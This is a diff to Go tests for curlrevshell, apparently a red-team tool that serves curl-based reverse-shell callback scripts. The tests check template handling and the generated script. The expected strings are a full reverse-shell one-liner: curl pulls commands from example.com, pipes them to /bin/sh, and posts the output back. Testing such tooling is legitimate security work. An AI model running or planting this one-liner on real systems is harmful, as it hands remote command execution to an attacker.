@@ -5,7 +5,7 @@ package hsrv
  * Tests for script.go
  * By J. Stuart McMurray
  * Created 20240324
- * Last Modified 20240925
+ * Last Modified 20241222
  */
 
 import (
@@ -20,6 +20,8 @@ import (
 	"testing"
 	"text/template"
 
+	"github.com/magisterquis/curlrevshell/lib/chanlog"
+	"github.com/magisterquis/curlrevshell/lib/crstemplate"
 	"github.com/magisterquis/curlrevshell/lib/opshell"
 )
 
@@ -54,16 +56,15 @@ func TestServerScriptHandler(t *testing.T) {
 
 	/* Make sure the template came out ok, too. */
 	wantBody := `#!/bin/sh
-
-curl -Nsk --pinnedpubkey "sha256//xxx=" https://example.com/i/IDID </dev/null 2>&0 |
+curl -sk --pinnedpubkey sha256//xxx= https://example.com/i/IDID -N  </dev/null 2>&0 |
 /bin/sh 2>&1 |
-curl -Nsk --pinnedpubkey "sha256//xxx=" https://example.com/o/IDID -T- >/dev/null 2>&1
+curl -sk --pinnedpubkey sha256//xxx= https://example.com/o/IDID -T- >/dev/null 2>&1
 `
 	gotBody := rr.Body.String()
 	gotBody = strings.ReplaceAll(gotBody, id, "IDID") /* Remove ID */
 	gotBody = regexp.MustCompile(                     /* Remove hash */
-		`"sha256//[0-9A-z+/]{43}="`,
-	).ReplaceAllString(gotBody, `"sha256//xxx="`)
+		`sha256//[0-9A-z+/]{43}=`,
+	).ReplaceAllString(gotBody, `sha256//xxx=`)
 	if gotBody != wantBody {
 		t.Errorf(
 			"Incorrect body:\n"+
@@ -85,7 +86,12 @@ func TestServerScriptHandler_FromFile(t *testing.T) {
 	s.defTmpl = template.Must(template.New("").Parse(defTxt))
 
 	var want string
+	const wantDefault = "WANT_DEFAULT"
 
+	/* f Makes a request to scriptHandler and barfs if the response code
+	isn't correct.  The response body is checked against the variable
+	want, declared above, unless want is wantDefault, in which case
+	checkDefaultCallbackScript is used. */
 	f := func(t *testing.T, expResCode int) {
 		t.Helper()
 		rr := httptest.NewRecorder()
@@ -101,7 +107,9 @@ func TestServerScriptHandler_FromFile(t *testing.T) {
 				expResCode,
 			)
 		}
-		if got := rr.Body.String(); got != want {
+		if got := rr.Body.String(); wantDefault == want {
+			checkDefaultCallbackScript(t, got)
+		} else if got != want {
 			t.Errorf(
 				"Incorrect body:\n got: %s\nwant: %s",
 				got,
@@ -111,16 +119,20 @@ func TestServerScriptHandler_FromFile(t *testing.T) {
 		cl.ExpectEmpty(t)
 	}
 
-	/* Test a custom template file. */
+	/* Test a custom template file with a subtemplate. */
 	t.Run("template_in_file", func(t *testing.T) {
 		if err := os.WriteFile(
 			fn,
-			[]byte(`kittens: {{.URL}}`),
+			[]byte(
+				`{{define "script"}}`+
+					`templatey kittens: {{.URL}}`+
+					`{{end}}`,
+			),
 			0660,
 		); nil != err {
 			t.Fatalf("Error writing template to %s: %s", fn, err)
 		}
-		want = "kittens: example.com"
+		want = "templatey kittens: example.com"
 		f(t, http.StatusOK)
 	})
 
@@ -128,7 +140,7 @@ func TestServerScriptHandler_FromFile(t *testing.T) {
 	t.Run("changed_file", func(t *testing.T) {
 		if err := os.WriteFile(
 			fn,
-			[]byte(`moose: {{.URL}}`),
+			[]byte(`{{define "script"}}moose: {{.URL}}{{end}}`),
 			0660,
 		); nil != err {
 			t.Fatalf("Error writing template to %s: %s", fn, err)
@@ -147,8 +159,7 @@ func TestServerScriptHandler_FromFile(t *testing.T) {
 			)
 		}
 		want = ""
-		t.Run("empty_file", func(t *testing.T) { f(t, http.StatusOK) })
-		f(t, http.StatusOK)
+		f(t, http.StatusInternalServerError)
 	})
 
 	/* Test removing the file. */
@@ -156,8 +167,8 @@ func TestServerScriptHandler_FromFile(t *testing.T) {
 		if err := os.Remove(fn); nil != err {
 			t.Fatalf("Error removing %s: %s", fn, err)
 		}
-		want = ""
-		f(t, http.StatusInternalServerError)
+		want = wantDefault
+		f(t, http.StatusOK)
 	})
 }
 
@@ -250,4 +261,103 @@ func TestC2URL(t *testing.T) {
 		})
 	}
 	cl.ExpectEmpty(t)
+}
+
+// checkDefaultCallbackScript checks to see if got looks like the default
+// callback script.  The ID and publickey will be replaced  with dummy values.
+func checkDefaultCallbackScript(t *testing.T, got string) {
+	t.Helper()
+	/* Make sure the template came out ok, too. */
+	want := `#!/bin/sh
+curl -sk --pinnedpubkey sha256//xxx= https://example.com/i/zzz -N  </dev/null 2>&0 |
+/bin/sh 2>&1 |
+curl -sk --pinnedpubkey sha256//xxx= https://example.com/o/zzz -T- >/dev/null 2>&1
+`
+
+	/* Replace unreliable bits with dummy values. */
+	got = regexp.MustCompile( /* Remove hash. */
+		`sha256//[0-9A-z+/]{43}=`,
+	).ReplaceAllString(got, `sha256//xxx=`)
+	got = regexp.MustCompile( /* Remove random ID. */
+		`https://example.com/(i|o)/\S+`,
+	).ReplaceAllString(got, `https://example.com/$1/zzz`)
+
+	/* See if it looks right. */
+	if want != got {
+		t.Errorf(
+			"Incorrect body:\n"+
+				"got:\n%s\n"+
+				"want:\n%s",
+			got,
+			want,
+		)
+	}
+}
+
+// Make sure we can set the script URL in the output.
+func TestServer_SetScriptURLPath(t *testing.T) {
+	var (
+		_, sl = chanlog.New()
+		want  = "kittens"
+	)
+	s, err := New(
+		sl,
+		"127.0.0.1:0",
+		"",
+		"",
+		nil,
+		nil,
+		nil,
+		"",
+		nil,
+		false,
+		true,
+		crstemplate.URLPaths{
+			In:     "up_In",
+			InOut:  "up_InOut",
+			Out:    "up_Out",
+			Script: want,
+		},
+	)
+	if nil != err {
+		t.Fatalf("New returned error: %s", err)
+	}
+
+	/* Regex to extract the URL path. */
+	re := regexp.MustCompile(
+		`curl -sk --pinnedpubkey sha256//[a-zA-Z0-9+/]+= ` +
+			`https://127.0.0.1:\d+/(\S+) \| /bin/sh`,
+	)
+
+	/* Extract our URL bit, hopefully. */
+	for _, l := range lAddrLines(t, s, crstemplate.SubtemplateCallback) {
+		/* Don't bother with empty lines. */
+		if "\n" == l {
+			continue
+		}
+		if ms := re.FindStringSubmatch(l); 2 != len(ms) {
+			t.Errorf("Could not parse callback help line: %q", l)
+		} else if got := ms[1]; got != want {
+			t.Errorf(
+				"Incorrect script path:\n"+
+					" have: %q\n"+
+					"ms[0]: %q\nms[1]: %q\n"+
+					"  got: %s\n"+
+					" want: %s",
+				l,
+				ms[0], ms[1],
+				got,
+				want,
+			)
+		}
+	}
+}
+
+// lAddrLines wraps s.lAddrLines, terminating the test on error.
+func lAddrLines(t *testing.T, s *Server, st string) []string {
+	ls, err := s.lAddrLines(st)
+	if nil != err {
+		t.Fatalf("Error generating callback lines: %s", err)
+	}
+	return ls
 }
